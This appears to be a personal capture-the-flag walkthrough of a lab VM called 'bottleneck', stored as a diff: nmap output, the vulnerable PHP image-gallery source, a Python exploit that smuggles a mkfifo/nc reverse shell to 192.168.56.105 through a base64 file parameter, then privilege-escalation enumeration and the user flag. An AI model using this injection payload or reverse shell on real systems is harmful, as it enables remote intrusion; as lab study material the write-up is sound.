@@ -1,7 +1,199 @@
-└─$ nmap -sV -sC -p 80 172.16.33.88 --min-rate 900 -Pn 
-Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-13 19:33 PST
-Nmap scan report for 172.16.33.88
-Host is up.
+└─$ nmap -sSCV -p 80 192.168.56.112
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-05 21:18 PST
+Nmap scan report for 192.168.56.112
+Host is up (0.00049s latency).
 
-PORT   STATE    SERVICE VERSION
-80/tcp filtered http
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx
+|_http-title: BOTTLENECK
+MAC Address: 08:00:27:18:7F:6A (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
+
+
+//inside image_gallery.php page:
+/*
+CHANGELOG
+v1.1: Still testing without content.
+    I've fixed that problem that @p4w and @ska notified me after hacker attack.
+    Shit I'm too lazy to make a big review of my code.
+    I think that the LFI problem can be mitigated with the blacklist.
+    By the way to protect me from attackers, all malicious requests are immediately sent to the SOC
+
+v1.0: Starting this beautiful gallery
+*/
+
+$tstamp = time();
+if(isset($_GET['t']) && isset($_GET['f'])){
+    include_once 'image_gallery_load.php';
+    exit();
+}
+
+?>
+<!DOCTYPE html>
+<html lang="en">
+
+//we got the load page,  image_gallery_load.php
+
+<?php
+function print_troll(){
+    $messages = $GLOBALS['messages'];
+    $troll = $GLOBALS['troll'];
+    echo $messages[0];
+    echo $troll;
+}
+
+$troll = <<<EOT
+<pre>
+                                   _,..._
+                                  /__    \
+                                   >< `.  \
+                                  /_    \ |
+                                   \-_  /:|
+                                 ,--'..'. :
+                               ,'         `.
+                            _,'             \
+                   _.._,--''    ,           |
+               , ,',, _|    _,.'|      |    |
+            \\||/,'(,' '--''    |      |    |
+       _     |||                |      /-'  |
+      | |   (- -)<`._           |     /    /
+      | |  \_\O/_/`-.(<<        |____/    /
+      | |   /   \              / -'| `--.'|
+      | |   \___/             /           /
+      | |    H H             /     |     |
+      |_|_..-H-H--.._       /     ,|     |
+        |-.._"_"__..-|     |   _-/ |     |
+        |            |     |    |   \_   |
+        |            |     |    |   |    |
+        |            |     |____|   |    |
+        |            |  _..'    |   |____|
+        |            |_(____..._' _.'    |
+        `-..______..-'""         (___..--'
+<pre>
+EOT;
+
+if(!isset($_GET['t']) || !isset($_GET['f'])){
+    exit();
+}
+
+$imagefile = base64_decode($_GET['f']);
+$timestamp = time();
+$isblocked = FALSE;
+$blacklist = array('/etc','/opt','/var','/opt','/proc','/dev','/lib','/bin','/usr','/home','/ids');
+$messages = array("\nLet me throw away your nice request into the bin.\n".
+    "The SOC was informed about your attempt to break into this site. Thanks to previous attackers effort in smashing my infrastructructure I will take strong legal measures.\n".
+    "Why don't you wait on your chair until someone (maybe the police) knock on your door?\n\n");
+
+if(abs($_GET['t'] - $timestamp) > 10){
+    exit();
+}
+foreach($blacklist as $elem){
+    if(strstr($imagefile, $elem) !== FALSE)
+        $isblocked = TRUE;
+}
+// report the intrusion to the soc and save information locally for further investigation
+if($isblocked){
+    $logfile = 'intrusion_'.$timestamp;
+    $fp = fopen('/var/log/soc/'.$logfile, 'w');
+    fwrite($fp, "'".$imagefile."'");
+    fclose($fp);
+    exec('python /opt/ids_strong_bvb.py </var/log/soc/'.$logfile.' >/tmp/output 2>&1');
+    print_troll();
+    exit();
+}
+chdir('img');
+$filecontent = file_get_contents($imagefile);
+if($filecontent === FALSE){
+  
+    print_troll();
+}
+else{
+    echo $filecontent;
+}
+chdir('../');
+
+?>
+
+//finally my py script:
+  import requests
+  import base64
+  import time
+  import datetime
+  url = "http://bottleneck/image_gallery.php?t="
+  # payload = "bottleneck_dontbe.png"
+  # payload = "../image_gallery_load.php"
+  payload = "../etc/passwd' and __import__(\"os\").system(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.105 8821 > /tmp/f\") and '"
+  pbyte= base64.b64encode(payload.encode("ascii"))
+  # print(pbyte)
+  pstr = pbyte.decode("ascii")
+  t = round(time.time())-2
+  r = requests.get(url+str(t)+"&f="+pstr)
+  print(r.text)
+
+sudo -l
+
+www-data@bottleneck:/tmp$ sudo -u bytevsbyte /var/www/html/web_utils/clear_logs
+<do -u bytevsbyte /var/www/html/web_utils/clear_logs
+bytevsbyte@bottleneck:/tmp$ sudo -l
+sudo -l
+[sudo] password for bytevsbyte: 
+
+
+cd bytevsbyte
+ls -la
+total 48
+drwx------ 6 bytevsbyte bytevsbyte 4096 Sep 27  2019 .
+drwxr-xr-x 3 root       root       4096 Sep 23  2019 ..
+lrwxrwxrwx 1 bytevsbyte bytevsbyte    9 Sep 24  2019 .bash_history -> /dev/null
+-rw-r--r-- 1 bytevsbyte bytevsbyte  220 Apr  4  2019 .bash_logout
+-rw-r--r-- 1 bytevsbyte bytevsbyte 3771 Sep 24  2019 .bashrc
+drwx------ 2 bytevsbyte bytevsbyte 4096 Sep 24  2019 .cache
+drwx------ 3 bytevsbyte bytevsbyte 4096 Sep 24  2019 .gnupg
+drwxrwxr-x 3 bytevsbyte bytevsbyte 4096 Sep 24  2019 .local
+-rw-r--r-- 1 bytevsbyte bytevsbyte  807 Apr  4  2019 .profile
+-rw-rw-r-- 1 bytevsbyte bytevsbyte   66 Sep 25  2019 .selected_editor
+drwx------ 2 bytevsbyte bytevsbyte 4096 Sep 27  2019 .ssh
+-rw-r--r-- 1 bytevsbyte bytevsbyte  148 Sep 26  2019 user.txt
+-rw------- 1 bytevsbyte bytevsbyte   56 Sep 27  2019 .Xauthority
+cat user.txt
+Good job, this is the user flag of bottleneck machine by @bytevsbyt3 (twitter).
+I hope you liked the flow.
+
+flag{gr34t_j0b_f0r_bottleneck_us3r}
+
+bytevsbyte@bottleneck:/tmp$ find / -perm -u=s 2>/dev/null
+find / -perm -u=s 2>/dev/null
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/snapd/snap-confine
+/usr/lib/openssh/ssh-keysign
+/usr/test/testlib
+/usr/bin/su
+/usr/bin/sudo
+/usr/bin/fusermount
+/usr/bin/umount
+/usr/bin/chsh
+/usr/bin/gpasswd
+/usr/bin/mount
+/usr/bin/passwd
+/usr/bin/chfn
+/usr/bin/newgrp
+/usr/bin/at
+
+//test/testlib is abnormal here
+
+bytevsbyte@bottleneck:~/html/web_utils$ cat /usr/test/testlib.c
+cat /usr/test/testlib.c
+#include <dlfcn.h>
+#include <unistd.h>
+
+int main(int argc, char *argv[]){
+    void *handle;
+    int (*function)();
+    if(argc < 2)
+        return 1;
+    handle = dlopen(argv[1], RTLD_LAZY);
+    function = dlsym(handle, "test_this");
+    function();
+    return 0;
+
+//try to cp a reverse shell .so file, complier from c file. bu tfail to ge the root shell.
